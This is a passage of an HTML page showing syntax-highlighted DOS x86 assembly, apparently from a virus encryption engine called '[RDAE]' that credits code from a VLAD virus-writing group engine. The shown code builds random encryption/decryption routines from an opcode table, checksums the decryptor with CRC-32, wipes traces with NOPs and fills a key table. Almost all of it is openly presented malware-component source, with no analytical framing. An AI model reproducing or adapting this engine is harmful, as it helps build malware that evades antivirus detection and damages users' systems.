         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gen_crc_tbl_</span><span class="sc0">    </span><span class="sc1">; Not zero? Jump to gen_crc_tbl_</span><span class="sc0">

</span><span class="sc5">wipeout_info</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Wipeout information</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10010000b</span><span class="sc0">    </span><span class="sc1">; NOP (opcode 90h)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Store eight NOPs</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">encrypt_algo</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">; Store NOPs</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Store eight NOPs</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">decrypt_algo</span><span class="sc4">-</span><span class="sc5">encryp_end</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">       </span><span class="sc1">; Store NOPs</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">key_table</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; BX = offset of key_table</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_table</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Store four decryption algorithm ...</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">decrypt_ptr</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DI = offset of decrypt_ptr</span><span class="sc0">
</span><span class="sc5">sto_idx_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store offset of key_table</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = offset of algori_table</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store offset of algori_table</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; AX = offset of key_table</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">sto_idx_loop</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">calc_crc32</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Calculate CRC-32 checksum</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">decryp_end</span><span class="sc4">-</span><span class="sc5">decryp_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">decrypt_algo</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">
</span><span class="sc5">crc32_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Zero BX</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; BL = low-order byte of index reg...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; BL = low-order byte of index reg...</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply index register by four</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;    "       "      "     "   "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; AL = low-order byte of low-order...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; AH = high-order byte of low-orde...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; DL = low-order byte of low-order...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; Zero DH</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Add delta offset to offset withi...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">crc32_table</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">crc32_table</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crc32_loop</span><span class="sc0">

         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; DX = high-order word of CRC-32 c...</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Modified version of the Random Number Generator (RNG) used in the Rickety</span><span class="sc0">
</span><span class="sc1">; and Hardly Insidious yet New Chaos Engine v 2.00 [RHINCE] by</span><span class="sc0">
</span><span class="sc1">; Rhincewind/VLAD.</span><span class="sc0">
</span><span class="sc5">get_rnd_num</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get 8-bit random number</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; AL = 8-bit random number</span><span class="sc0">

         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">random_num</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Add current 8-bit random number ...</span><span class="sc0">
</span><span class="sc5">random_num</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; 8-bit random number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; AX = 8-bit random number</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">rnd_in_range</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get random number within range</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BL = number within range</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd_num</span><span class="sc0">

         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">; AH = random number within range</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">       </span><span class="sc1">; BL =   "      "      "      "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">       </span><span class="sc1">; Zero BH</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">exam_sto_key</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine, store encryption/decryp...</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">algori_end</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; BX = offset of algori_end</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Encryption/decryption algorithm...?</span><span class="sc0">
         </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">dont_sto_key</span><span class="sc0">    </span><span class="sc1">; Below or equal? Jump to dont_sto...</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; DI = offset of encryption/decryp...</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store encryption/decryption key</span><span class="sc0">
</span><span class="sc5">dont_sto_key</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' [RDAE] '</span><span class="sc0">          </span><span class="sc1">; Name of the engine</span><span class="sc0">
</span><span class="sc5">algori_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">algori_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; Decryption algorithm</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc5">segcs</span><span class="sc0">           </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc5">segcs</span><span class="sc0">           </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc5">segcs</span><span class="sc0">           </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc5">segcs</span><span class="sc0">           </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Encryption     "</span><span class="sc0">
</span><span class="sc5">algori_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Encryption     "</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decryption     "</span><span class="sc0">
</span><span class="sc5">algori_end_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">crc32</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; CRC-32 of the decryption algorithm</span><span class="sc0">
</span><span class="sc5">key_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">key_table</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">51h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Table of encryption/decryption keys</span><span class="sc0">
</span><span class="sc5">key_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rdae_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rdae_length</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">rdae_end</span><span class="sc4">-</span><span class="sc5">rdae_begin</span><span class="sc4">)</span></div></body>
</html>
